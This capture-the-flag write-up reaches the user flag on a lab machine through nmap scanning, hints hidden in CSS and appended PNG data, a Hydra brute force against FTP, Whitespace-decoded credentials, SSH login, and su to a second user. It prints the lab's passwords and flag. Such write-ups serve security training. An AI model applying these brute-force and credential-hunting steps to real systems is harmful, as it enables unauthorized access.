# Le Bananier des Montagnes — Part 1 — `user.txt`

## Objective

Obtain the user flag:

```text
user.txt
```

Target during this run:

```text
10.10.0.13
```



## 1. Reconnaissance

A service scan was performed:

```bash
nmap -sC -sV -Pn 10.10.0.13
```

A full TCP port scan confirmed the exposed services:

```bash
nmap -p- --min-rate 5000 -Pn 10.10.0.13
```

Results:

```text
21/tcp  FTP   vsftpd 3.0.5
22/tcp  SSH   OpenSSH 10.0p2
80/tcp  HTTP  Apache 2.4.68
```

The attack surface was therefore:

- FTP
- SSH
- HTTP

Anonymous FTP authentication was tested but rejected.



## 2. Web Enumeration

The HTTP service displayed the default Apache page.

The page source contained an unusual JavaScript message:

```javascript
confirm("Have you checked everything yet? Maybe the video?")
```

The page also referenced:

```text
/assets/style.css
```

Directory listing was enabled on `/assets/` and revealed:

```text
MusaTroglodytarum.mp4
style.css
```

The CSS file contained an important comment:

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
*/
```

This demonstrates why source files such as CSS must also be inspected during web enumeration.



## 3. Hidden Directory Discovery

The hidden PHP page was requested:

```bash
curl -i http://10.10.0.13/l3_B4n4N13r_D3s_M0nT4gN3s.php
```

It returned a redirect containing another hidden path:

```text
/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
```

Opening this directory revealed:

```text
Hot_Babe.png
```

The image was downloaded for analysis.



## 4. Hidden Data Inside the PNG

The image was inspected with:

```bash
exiftool Hot_Babe.png
```

ExifTool reported:

```text
Warning : Trailer data after PNG IEND chunk
```

This means additional data had been appended after the normal end of the PNG file.

The trailer was extracted with Python.

The hidden text started with:

```text
Eh, you've earned this. Username for FTP is banane_celeste
One of these is the password:
```

It was followed by approximately 200 password candidates.

This gave us the FTP username:

```text
banane_celeste
```



## 5. FTP Password Discovery

The candidates were extracted into a wordlist:

```bash
tail -n +4 trailer.bin | sed '/^[[:space:]]*$/d' > ftp_passwords.txt
```

Hydra was then used with a single thread because the FTP server rejected too many simultaneous connections:

```bash
hydra -l banane_celeste -P ftp_passwords.txt -t 1 -W 1 -f ftp://10.10.0.13
```

Valid credentials were found:

```text
Username: banane_celeste
Password: gPKTq8qo+MzagarcIxgO
```



## 6. FTP Enumeration

The FTP service was accessed:

```bash
ftp 10.10.0.13
```

The account contained:

```text
Valerian's_Creds.txt
```

The file was downloaded:

```text
get "Valerian's_Creds.txt"
```

At first, the file appeared to contain mostly blank lines followed by French text.

Displaying invisible characters revealed large quantities of spaces and tabs:

```bash
cat -A "Valerian's_Creds.txt"
```

This indicated **Whitespace encoding**.



## 7. Whitespace Decoding

Whitespace is an esoteric programming language where instructions are represented using only:

- spaces;
- tabs;
- line feeds.

The hidden data was decoded and produced:

```text
User: valerian
Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
```

These credentials allowed SSH access.



## 8. SSH Access as `valerian`

Connection:

```bash
ssh valerian@10.10.0.13
```

After authentication, the system displayed an unusual message:

```text
Hi, just a reminder that in case of need,
check our """s3cr3t""" hiding place.
```

A search revealed:

```text
/usr/games/s3cr3t
```

The directory contained a hidden file:

```text
/usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```

Its content revealed:

```text
Yo gab,
Careful about your password...

"ca_serait_jamais_arrive_en_haskell"
```



## 9. Access as `gabriel`

System users were enumerated:

```bash
awk -F: '$3 >= 1000 && $1 != "nobody" {print $1, $3, $6, $7}' /etc/passwd
```

Results included:

```text
gabriel
valerian
banane_celeste
```

The nickname `gab` therefore referred to `gabriel`.

The account was accessed locally:

```bash
su - gabriel
```

Password:

```text
ca_serait_jamais_arrive_en_haskell
```

Authentication succeeded.



## 10. User Flag

Gabriel's home directory contained:

```text
/home/gabriel/user.txt
```

The flag was retrieved with:

```bash
cat ~/user.txt
```

Result:

```text
EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}
```



## Attack Path

```text
Nmap
  ↓
Apache Web Server
  ↓
CSS Source Inspection
  ↓
Hidden PHP Page
  ↓
Hidden Directory
  ↓
Hot_Babe.png
  ↓
Data appended after PNG IEND
  ↓
FTP username + password candidates
  ↓
Hydra
  ↓
FTP access
  ↓
Valerian's_Creds.txt
  ↓
Whitespace decoding
  ↓
SSH as valerian
  ↓
Hidden /usr/games/s3cr3t message
  ↓
Gabriel credentials
  ↓
su - gabriel
  ↓
user.txt
```

## Skills Demonstrated

- Network reconnaissance with Nmap
- Web enumeration
- Source-code and CSS inspection
- Hidden directory discovery
- File metadata analysis
- Extraction of appended PNG data
- Targeted password attack with Hydra
- FTP enumeration
- Whitespace decoding
- SSH authentication
- Linux user enumeration
- Credential reuse / lateral movement
- User flag acquisition
